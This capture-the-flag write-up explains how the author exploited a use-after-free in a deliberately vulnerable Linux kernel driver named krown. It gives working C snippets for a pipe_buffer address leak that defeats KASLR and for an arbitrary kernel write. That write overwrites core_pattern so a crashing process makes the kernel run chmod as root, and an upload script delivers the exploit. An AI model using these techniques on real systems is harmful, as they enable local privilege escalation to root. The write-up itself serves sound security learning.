# Heavy is the Krown — Writeup

## The short version

This challenge gives us a tiny Linux virtual machine with a custom kernel
driver at `/dev/krown`.

The driver lets us create two kinds of objects:

- a **crown**, which stores pointers to other objects;
- **regalia**, which can be attached to a crown.

The bug is that regalia can be destroyed without removing its pointer from the
crown. The crown is therefore left pointing at memory which has already been
freed. This is called a **use-after-free**, or UAF.

We reuse that freed memory twice:

1. First, a pipe reuses it and gives us a kernel address, defeating KASLR.
2. Then, another crown reuses it and gives us an arbitrary kernel write.

We use the write to change Linux's `core_pattern` setting. When a process
crashes, the kernel then runs:

```text
/bin/chmod 777 /flag.txt
```

as root. After that, the unprivileged user can simply read the flag.

---

## Files provided

The challenge contained:

```text
initramfs.cpio.gz
run.sh
vmlinuz
```

`run.sh` showed that this was a kernel-pwn challenge:

```sh
qemu-system-x86_64 \
    -cpu qemu64,+smep,+smap \
    -kernel ./vmlinuz \
    -initrd ./initramfs.cpio.gz \
    -append 'console=ttyS0 quiet loglevel=3 oops=panic panic=1 init=/init root=/dev/ram0' \
    -smp 2 \
    -m 256M
```

In plain English, the challenge boots a small Linux VM with two important
protections enabled:

- **SMEP** prevents the kernel from executing code stored in user memory.
- **SMAP** prevents casual kernel access to user memory.

The kernel also uses KASLR, so its addresses move on every boot.

I extracted the initial filesystem with:

```sh
mkdir initramfs
cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idm
```

The interesting files were:

```text
/lib/modules/krown.ko
/flag.txt
/init
```

The flag was owned by root and had mode `0400`, while the shell ran as UID
65534 (`nobody`). The init script also mounted `/tmp` with `noexec`, which
became relevant when uploading the final exploit.

---

## Looking at the driver

The module was not stripped, so its function names survived:

```sh
nm -nS initramfs/lib/modules/krown.ko
```

Some especially useful names were:

```text
krown_ioctl
krown_alloc
krown_bind
krown_unbind
krown_break
krown_examine
krown_impress
krown_witness
krown_inscribe
registry
global_cookie
```

Disassembling it with `objdump`:

```sh
objdump -drwC -Mintel initramfs/lib/modules/krown.ko
```

revealed these ioctl commands:

| Command | Value | Purpose |
|---|---:|---|
| Allocate crown | `0xc1204b00` | Create a type-1 object |
| Allocate regalia | `0xc1204b01` | Create a type-2 object |
| Break | `0x41204b02` | Destroy an object |
| Bind | `0x41204b03` | Attach regalia to a crown |
| Unbind | `0x41204b04` | Remove a crown attachment |
| Examine | `0xc1204b05` | Read from attached regalia |
| Impress | `0x41204b06` | Write to attached regalia |
| Witness | `0xc1204b07` | Read through a crown data pointer |
| Inscribe | `0x41204b08` | Write through a crown data pointer |

Every request is `0x120` bytes:

```c
struct req {
    uint32_t id;
    int32_t  index;
    uint64_t offset;
    uint64_t size;
    uint64_t reserved;
    unsigned char data[0x100];
};
```

The driver supports 64 live objects through a global registry.

---

## The object layout

Both crowns and regalia are allocated with:

```c
kmalloc(0x1f0, ...);
```

An allocation of `0x1f0`, or 496 bytes, is serviced by the kernel's
`kmalloc-512` cache.

A crown looks roughly like this:

```text
+0x00  object ID
+0x04  object type (1 for crown)
+0x08  random validation cookie
+0x10  backing-data pointer
...
+0x48  number of attached regalia
+0x50  pointer to attached regalia 0
+0x58  pointer to attached regalia 1
...
+0xc8  pointer to attached regalia 15
```

The cookie makes it harder to pass a completely fake object to the driver, but
it does not help when a real object is freed while another real object still
points to it.

---

## The vulnerability

The vulnerable sequence is:

1. Allocate a crown.
2. Allocate regalia.
3. Bind the regalia to the crown.
4. Break the regalia.

`krown_break()` clears the regalia's global registry entry and calls `kfree()`.
However, it does **not** search through crowns and remove any pointers to that
regalia.

The situation now looks like this:

```text
crown ---> freed kmalloc-512 slot
```

The pointer is often called a **dangling pointer**. It still contains an
address, but that address no longer belongs to the original object.

This is dangerous because `K_EXAMINE` and `K_IMPRESS` trust the pointer stored
inside the crown. They let us read or write up to 256 bytes in whatever later
reuses that freed slot.

An everyday analogy is returning a hotel-room key while secretly keeping a
copy. Once the room is assigned to somebody else, the old key still opens it.

---

## Step 1: Reusing the slot with a pipe

The first obstacle was KASLR. Even with a memory corruption bug, I did not know
where useful kernel data lived.

Linux pipes provided a convenient address leak. A pipe owns an array of
`struct pipe_buffer` objects. On this kernel, each entry is 40 bytes:

```text
8 entries × 40 bytes = 320 bytes
```

A 320-byte request also belongs to `kmalloc-512`, exactly like a krown object.

The exploit creates a pipe and resizes it to eight pages:

```c
int p[2];
pipe(p);
fcntl(p[0], F_SETPIPE_SZ, 8 * 4096);
write(p[1], "X", 1);
```

Writing one byte initializes the first pipe-buffer entry. Among other things,
that entry contains:

```text
+0x00  page pointer
+0x08  offset and length
+0x10  pointer to anon_pipe_buf_ops
```

Because the pipe ring reuses the freed regalia slot, `K_EXAMINE` reads the pipe
structure through the crown's dangling pointer:

```c
r.id     = parent;
r.index  = 0;
r.offset = 0;
r.size   = 0x100;
ioctl(fd, K_EXAMINE, &r);

uint64_t leaked_ops = ((uint64_t *)r.data)[2];
```

`anon_pipe_buf_ops` lives at a known offset inside the supplied kernel image.
Its non-randomized address was:

```text
anon_pipe_buf_ops = 0xffffffff82221fd8
```

The KASLR slide is therefore:

```c
slide = leaked_ops - 0xffffffff82221fd8;
```

For example, the remote run leaked:

```text
anon_pipe_buf_ops = 0xffffffff94e21fd8
slide             = 0x12c00000
```

Pinning the process to CPU 0 helped make the allocator reuse predictable,
because small kernel allocations use per-CPU freelists:

```c
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);
```

---

## Step 2: Turning the UAF into an arbitrary write

After leaking the kernel address, the exploit closes both pipe descriptors.
This frees the pipe ring and returns the same slot to `kmalloc-512`.

It then allocates another crown:

```c
close(p[0]);
close(p[1]);

uint32_t arb = alloc_obj(K_ALLOC_CROWN);
```

The new crown reuses the old slot:

```text
original crown's dangling pointer
              |
              v
       newly allocated crown
```

That new crown is a genuine object with the correct ID, type and random cookie.
The driver therefore accepts it normally.

Using `K_IMPRESS` through the original crown, the exploit overwrites offset
`0x10` of the new crown:

```c
r.id     = parent;
r.index  = 0;
r.offset = 0x10;
r.size   = 8;
memcpy(r.data, &target_address, 8);
ioctl(fd, K_IMPRESS, &r);
```

Offset `0x10` is the crown's backing-data pointer. `K_INSCRIBE` later copies
attacker-controlled data through that pointer without verifying where the
pointer leads.

That gives the exploit a practical arbitrary kernel write:

```text
set crown->data_pointer = target kernel address
call K_INSCRIBE
kernel writes our bytes to the target
```

No kernel code execution or ROP chain was needed, so SMEP and SMAP never became
a problem.

---

## Step 3: Overwriting `core_pattern`

The supplied kernel had:

```text
core_pattern = 0xffffffff82960e00
```

Its runtime address was calculated using the leaked slide:

```c
runtime_core_pattern = 0xffffffff82960e00 + slide;
```

Linux consults `core_pattern` when a process crashes. If the value begins with
`|`, the remainder is executed as a userspace core-dump helper. The helper is
started by the kernel with root privileges.

The exploit writes this string:

```text
|/bin/chmod 777 /flag.txt
```

using the corrupted crown:

```c
const char pattern[] = "|/bin/chmod 777 /flag.txt";

r.id     = arb;
r.offset = 0;
r.size   = sizeof(pattern);
memcpy(r.data, pattern, sizeof(pattern));
ioctl(fd, K_INSCRIBE, &r);
```

Finally, it enables core dumps and deliberately crashes a child:

```c
struct rlimit lim = { RLIM_INFINITY, RLIM_INFINITY };
setrlimit(RLIMIT_CORE, &lim);

if (fork() == 0) {
    *(volatile uint64_t *)0 = 0x41414141;
}
```

The crash causes the kernel to run:

```sh
/bin/chmod 777 /flag.txt
```

as root. The exploit waits briefly, opens `/flag.txt`, and prints it.

---

## Building the exploit

The guest does not contain a compiler or normal shared libraries, so I built a
small static binary with musl:

```sh
musl-gcc -static -Os -s -Wall -Wextra -o exploit exploit.c
```

This produced a roughly 42 KB binary, much easier to upload than a normal
glibc-static build.

For local testing, I placed it inside a copy of the initramfs and booted the VM.
It returned:

```text
HTB{fake_flag_for_testing}
```

---

## Remote upload

`/tmp` is mounted with `noexec`, so uploading the binary there does not work.
The challenge leaves `/home` writable and executable.

Pasting one huge Base64 blob manually proved unreliable, so `remote.py`
compresses the exploit and uploads it in 768-character chunks:

```python
command("cd /home")
command(": > x.b64")

for off in range(0, len(payload), 768):
    chunk = payload[off:off + 768]
    command(f"printf '%s' '{chunk}' >> x.b64")

command("base64 -d x.b64 > x.gz && gzip -df x.gz && chmod 755 x")
io.sendline(b"./x")
```

It was run as:

```sh
python3 remote.py 154.57.164.66 30499
```

The important output was:

```text
[+] parent=0 child=1
[+] pipe size=32768
[+] pipe page=0xffffd8d240087b00 ops=0xffffffff94e21fd8
[+] KASLR slide=0x12c00000 core_pattern=0xffffffff95560e00
[+] arb crown=1
[+] core_pattern overwritten
[+] FLAG: HTB{h34vy_15_th3_kr0wn_7h4t_w34r5_th3_w31gh7_0f_4uth0r17y}
```

## Flag

```text
HTB{h34vy_15_th3_kr0wn_7h4t_w34r5_th3_w31gh7_0f_4uth0r17y}
```

## Final thoughts

The fun part of this challenge was that the original dangling pointer was not
the whole exploit. It was used in two different ways:

- reclaim it with a pipe to learn where the randomized kernel lives;
- reclaim it with a valid crown to create a controlled kernel pointer.

From there, changing `core_pattern` turned the low-level memory bug into a
simple permission change. In other words: make the kernel accidentally keep an
old room key, move useful things into that room, and keep opening the door.
